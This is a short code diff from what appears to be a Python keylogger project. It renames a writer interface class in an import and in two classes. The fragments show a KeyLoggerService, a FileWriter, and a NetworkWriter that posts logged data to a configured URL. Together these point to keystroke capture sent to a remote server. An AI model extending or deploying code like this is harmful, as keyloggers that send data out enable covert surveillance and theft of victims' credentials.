@@ -1,5 +1,5 @@
 import requests,time,ToolBox,pygetwindow,json,os,base64,yaml
-from Interface import IKeyLogger,Write
+from Interface import IKeyLogger,IWrite
 
 with open("config.yaml", "r") as f:
     config = yaml.safe_load(f)
@@ -37,7 +37,7 @@ class KeyLoggerService(IKeyLogger):
     def clear_logged_keys(self):
         self.__logged_keys = {}
 
-class FileWriter(Write):
+class FileWriter(IWrite):
     def __init__(self):
         self.path = ToolBox.get_file_path()
 
@@ -61,7 +61,7 @@ class FileWriter(Write):
         except (IOError, json.JSONDecodeError):
             return False
 
-class NetworkWriter(Write):
+class NetworkWriter(IWrite):
     def __init__(self):
         self.url =  URL
     def write(self, serial_number, data:dict[str:str]) -> bool:
